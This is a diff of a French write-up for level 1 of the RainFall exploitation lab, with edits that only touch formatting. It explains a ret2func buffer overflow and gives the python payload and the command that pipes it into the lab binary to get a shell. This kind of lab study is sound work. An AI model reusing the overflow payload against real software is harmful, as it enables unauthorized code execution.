@@ -1,6 +1,6 @@
 # Level 1
 
-Si on execute 'level1' on peut voir qu'il attend un input de la part de l'utilisateur.
+Si on execute `level1` on peut voir qu'il attend un input de la part de l'utilisateur.
 
 ```bash
 08048444 <run>:
@@ -50,14 +50,14 @@ Grace au resultat de objdump on peut s'apercevoir que:
 	3- L'existence d'une fonction 'run' mais jamais appeler qui fait un appel a 'system' en argument "/bin/sh"
 
 
-La technique employee est un ret2func, qui consiste a deborder le buffer jusqu’a ecraser l’adresse de retour (registre EIP) afin de la remplacer par l’adresse de la fonction run
+La technique employee est un ret2func, qui consiste a deborder le buffer jusqu’a ecraser l’adresse de retour (registre `EIP`) afin de la remplacer par l’adresse de la fonction run
 
 Pour cela on va faire ca en une ligne avec python remplir les 76 premiers octets puis rajouter l'addresse la fonction qu'on souhaite executer dans les 4 derniers octets
 ```python
 python -c 'print("A" * 76 + "\x44\x84\x04\x08")
 ```
 
-Il nous suffit d'envoyer le resultat dans notre executable tout en ajoutant l'appel a 'cat' pour garder le stdin ouvert apres l'envoie du payload
+Il nous suffit d'envoyer le resultat dans notre executable tout en ajoutant l'appel a `cat` pour garder le stdin ouvert apres l'envoie du payload
 
 ```bash
 level1@RainFall:~$ (python -c 'print("A" * 76 + "\x44\x84\x04\x08")' && cat) | ./level1
